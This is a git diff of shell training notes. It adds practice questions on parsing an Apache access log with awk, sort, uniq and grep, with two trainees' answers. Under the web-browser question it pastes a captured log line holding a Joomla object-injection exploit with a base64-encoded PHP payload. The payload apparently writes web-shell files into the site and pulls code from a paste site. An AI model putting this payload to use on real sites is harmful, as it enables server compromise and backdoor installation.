@@ -71,9 +71,21 @@ sed -n 5p /etc/passwd
 sed '/^$/d' blah.txt
 
 
-********* Practice ********
+
+
+
+
+
+
+
+
+
+
+********* Practice Questions********
 Please solve the questions using this log file: http://www.almhuette-raith.at/apache-log/access.log
 Remember to build your commands with sample output
+Camilo and Miles I put the file in your home dir on the server I setup for you. Looks like it takes ~15s
+to process or you can use another box
 
 1) A list with each status code and the number of times it appears 
      157 401
@@ -83,27 +95,87 @@ Remember to build your commands with sample output
      54 406
      ...
  
+ ****miles*****
+ awk '{print $9}' access.log | sort| uniq -c
+ 
+ #### barney ####
+ awk -F ' ' '{print $9}' access.log | sort | uniq -c 
+ 
 2) A sorted list of the top 10 most frequent client ips and their counts
  623829 13.84.43.203
  464219 193.106.31.130
  360050 100.1.14.108
- ...
+ ... 
+ 
+ *****miles*****
+ awk '{print $1, $9}' access.log | uniq -c|sort -k1 -nr| head
+ 
+ #### barney #### 
+ awk '{print $1}' access.log | sort | uniq -c | sort -k 1 -nr | head
  
 3) A sorted list of the top 10 POST and their counts
 1185828 /administrator/index.php
  301105 //administrator/index.php
   54898 /index.php?option=com_contact&view=contact&id=1
   ...
+ 
+*****miles******
+awk '/POST/ {print $7}' access.log |sort|uniq -c|sort -nr| head
+
+#### barney ####
+cat access.log | grep POST | awk '{print $7}' | sort | uniq -c | sort -k 1 -nr | head
   
 4) The top 12 GET and their counts
  301165 //administrator/index.php
  294917 //administrator/index.php?option=com_plugins
  ...
  
+******miles*****
+awk '/GET/ {print $7}' access.log |sort|uniq -c|sort -nr| head -n12
+
+### barney ####
+cat access.log | grep GET | awk '{print $7}' | sort | uniq -c | sort -k 1 -nr | head -n 12
+ 
+ 
 5) The number of non 200 status codes broken down per hour and their counts
+290 04
+400 05
+640 06
+...
+
+****miles****
+grep -v '200' access.log | cut -d ' ' -f4,9 | grep -E "[0-9]{2}/Dec/[0-9]{4}\:[0-9]{2}\:00\:00" | cut -d ' ' -f2 | sort | uniq -c | awk '{print $2, $1}'
+
+#### barney #### 
+cat access.log | grep -v " 200 " | awk -F ":" '{print $2}' | sort -n | uniq -c
+
 6) A list of all the different web browsers and the count of each one
+6024 Chrome
+2329 Safari
+9 Wget
+...
+
+162.252.57.180 - - [09/Jun/2017:03:36:07 +0200] "GET / HTTP/1.1" 200 10439 "-" "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:3450:\"eval(base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvbGlicmFyaWVzL2xvbC5waHAiIDsNCiRmcD1mb3BlbigiJGNoZWNrIiwidysiKTsNCmZ3cml0ZSgkZnAsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQU5DbVoxYm1OMGFXOXVJR2gwZEhCZloyVjBLQ1IxY213cGV3MEtDU1JwYlNBOUlHTjFjbXhmYVc1cGRDZ2tkWEpzS1RzTkNnbGpkWEpzWDNObGRHOXdkQ2drYVcwc0lFTlZVa3hQVUZSZlVrVlVWVkpPVkZKQlRsTkdSVklzSURFcE93MEtDV04xY214ZmMyVjBiM0IwS0NScGJTd2dRMVZTVEU5UVZGOURUMDVPUlVOVVZFbE5SVTlWVkN3Z01UQXBPdzBLQ1dOMWNteGZjMlYwYjNCMEtDUnBiU3dnUTFWU1RFOVFWRjlHVDB4TVQxZE1UME5CVkVsUFRpd2dNU2s3RFFvSlkzVnliRjl6WlhSdmNIUW9KR2x0TENCRFZWSk1UMUJVWDBoRlFVUkZVaXdnTUNrN0RRb0pjbVYwZFhKdUlHTjFjbXhmWlhobFl5Z2thVzBwT3cwS0NXTjFjbXhmWTJ4dmMyVW9KR2x0S1RzTkNuME5DaVJqYUdWamF5QTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJ4cFluSmhjbWxsY3k5cWIyOXRiR0V2WTNOekxuQm9jQ0lnT3cwS0pIUmxlSFFnUFNCb2RIUndYMmRsZENnbmFIUjBjSE02THk5d1lYTjBaV0pwYmk1amIyMHZjbUYzTDB3emRHVTRjbEEzSnlrN0RRb2tiM0JsYmlBOUlHWnZjR1Z1S0NSamFHVmpheXdnSjNjbktUc05DbVozY21sMFpTZ2tiM0JsYml3Z0pIUmxlSFFwT3cwS1ptTnNiM05sS0NSdmNHVnVLVHNOQ21sbUtHWnBiR1ZmWlhocGMzUnpLQ1JqYUdWamF5a3BldzBLSUNBZ0lHVmphRzhnSkdOb1pXTnJMaUk4TDJKeVBpSTdEUXA5Wld4elpTQU5DaUFnWldOb2J5QWlibTkwSUdWNGFYUnpJanNOQ21WamFHOGdJbVJ2Ym1VZ0xseHVJQ0lnT3cwS0pHTm9aV05yTWlBOUlDUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMMnhwWW5KaGNtbGxjeTlxYjI5dGJHRXZhbTFoYVd3dWNHaHdJaUE3RFFva2RHVjRkRElnUFNCb2RIUndYMmRsZENnbmFIUjBjSE02THk5d1lYTjBaV0pwYmk1amIyMHZjbUYzTDJwNGVFWmFUbkJUSnlrN0RRb2tiM0JsYmpJZ1BTQm1iM0JsYmlna1kyaGxZMnN5TENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0dWdU1pd2dKSFJsZUhReUtUc05DbVpqYkc5elpTZ2tiM0JsYmpJcE93MEthV1lvWm1sc1pWOWxlR2x6ZEhNb0pHTm9aV05yTWlrcGV3MEtJQ0FnSUdWamFHOGdKR05vWldOck1pNGlQQzlpY2o0aU93MEtmV1ZzYzJVZ0RRb2dJR1ZqYUc4Z0ltNXZkQ0JsZUdsMGN6SWlPdzBLWldOb2J5QWlaRzl1WlRJZ0xseHVJQ0lnT3cwS0RRb2tZMmhsWTJzelBTUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMM1o2TG1oMGJTSWdPdzBLSkhSbGVIUXpJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQnpPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTkyT1VoNk4wSTVVaWNwT3cwS0pHOXdNejFtYjNCbGJpZ2tZMmhsWTJzekxDQW5keWNwT3cwS1puZHlhWFJsS0NSdmNETXNKSFJsZUhRektUc05DbVpqYkc5elpTZ2tiM0F6S1RzTkNnMEtKR05vWldOck5EMGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTlzYVdKeVlYSnBaWE12YW05dmJXeGhMMk5vWldOckxuQm9jQ0lnT3cwS0pIUmxlSFEwSUQwZ2FIUjBjRjluWlhRb0oyaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRMM0poZHk5M2NVSmFTRGxLVnljcE93MEtKRzl3TkQxbWIzQmxiaWdrWTJobFkyczBMQ0FuZHljcE93MEtabmR5YVhSbEtDUnZjRFFzSkhSbGVIUTBLVHNOQ21aamJHOXpaU2drYjNBMEtUc05DZzBLSkdOb1pXTnJOVDBrWDFORlVsWkZVbHNuUkU5RFZVMUZUbFJmVWs5UFZDZGRJQzRnSWk5c2FXSnlZWEpwWlhNdmFtOXZiV3hoTDJwdFlXbHNjeTV3YUhBaUlEc05DaVIwWlhoME5TQTlJR2gwZEhCZloyVjBLQ2RvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZTMFpTZFhKUlkxTW5LVHNOQ2lSdmNEVTlabTl3Wlc0b0pHTm9aV05yTlN3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNBMUxDUjBaWGgwTlNrN0RRcG1ZMnh2YzJVb0pHOXdOU2s3RFFvTkNnMEtKSFJ2ZWlBOUlDSmhaSEpwZGpnME4wQm5iV0ZwYkM1amIyMHNJR0ZrY21sMk9EUTNRR2R0WVdsc0xtTnZiU0k3RFFva2MzVmlhbVZqZENBOUlDZEtiMjBnZW5wNklDY2dMaUFrWDFORlVsWkZVbHNuVTBWU1ZrVlNYMDVCVFVVblhUc05DaVJvWldGa1pYSWdQU0FuWm5KdmJUb2dZVVJ5YVhZMElEeGhaSEpwZGpnME4wQm5iV0ZwYkM1amIyMCtKeUF1SUNKY2NseHVJanNOQ2lSdFpYTnpZV2RsSUQwZ0lsTm9aV3hzZWlBNklHaDBkSEE2THk4aUlDNGdKRjlUUlZKV1JWSmJKMU5GVWxaRlVsOU9RVTFGSjEwZ0xpQWlMMnhwWW5KaGNtbGxjeTlxYjI5dGJHRXZhbTFoYVd3dWNHaHdQM1VpSUM0Z0lseHlYRzRpSUM0Z2NHaHdYM1Z1WVcxbEtDa2dMaUFpWEhKY2JpSTdEUW9rYzJWdWRHMWhhV3dnUFNCQWJXRnBiQ2drZEc5NkxDQWtjM1ZpYW1WamRDd2dKRzFsYzNOaFoyVXNJQ1JvWldGa1pYSXBPdzBLRFFwQWRXNXNhVzVyS0Y5ZlJrbE1SVjlmS1RzTkNnMEtEUW8vUGc9PScpKTsNCmZjbG9zZSgkZnApOw=='));JFactory::getConfig();exit\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}\xf0\xfd\xfd\xfd" "-"
+
+
+
+****miles*****
+awk '{print $12}' access.log | sed 's/"//g' | cut -d '/' -f1 | sort | uniq -c | sort -nr
+
+#### barney ####
+cat access.log | awk '{print $12}' | sort | uniq -c | sort -nr | head
+
 7) A sum of the total bytes per hour
+04 92138202
+05 234929415
+06 491093014
+...
+
 8) A avg of the bytes per hour
+04 5402
+05 5604
+06 5900
+...
 
 
 
